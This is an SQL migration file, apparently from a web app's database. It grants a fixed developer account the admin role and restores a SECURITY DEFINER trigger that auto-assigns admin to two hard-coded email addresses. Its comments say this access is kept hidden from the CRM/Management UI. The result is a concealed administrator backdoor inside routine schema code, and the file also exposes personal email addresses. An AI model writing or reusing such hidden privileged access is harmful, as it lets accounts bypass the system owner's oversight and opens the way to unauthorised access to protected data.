
-- Re-add admin role for developer (needed for RLS access to admin-only tables)
-- Stealth mode is maintained in frontend (hidden from CRM/Management UI)
INSERT INTO public.user_roles (user_id, role)
VALUES ('b07c5834-0872-47c1-9bc6-6fd49f4c4b46', 'admin')
ON CONFLICT (user_id, role) DO NOTHING;

-- Also restore the developer trigger to auto-assign admin role
CREATE OR REPLACE FUNCTION public.handle_developer_role()
 RETURNS trigger
 LANGUAGE plpgsql
 SECURITY DEFINER
 SET search_path TO 'public'
AS $function$
DECLARE
  developer_emails text[] := ARRAY['dev.goodyhut@gmail.com', 'shahriarnabil94@gmail.com'];
BEGIN
  IF NEW.email = ANY(developer_emails) THEN
    INSERT INTO public.user_roles (user_id, role)
    VALUES (NEW.id, 'admin')
    ON CONFLICT (user_id, role) DO NOTHING;
  END IF;
  RETURN NEW;
END;
$function$;
